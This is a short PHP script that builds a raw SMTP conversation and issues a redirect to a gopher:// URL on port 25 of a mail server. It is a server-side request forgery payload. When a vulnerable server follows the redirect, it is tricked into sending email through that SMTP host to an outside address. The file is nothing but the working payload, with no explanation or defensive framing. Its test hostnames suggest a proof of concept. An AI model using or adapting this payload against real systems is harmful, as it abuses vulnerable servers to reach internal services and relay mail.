<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: <aaaaaaaaaaa@tester.com>',
                'RCPT TO: <anishacks@gmail.com>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://test.smtp.org:25/_'.$payload);
?>
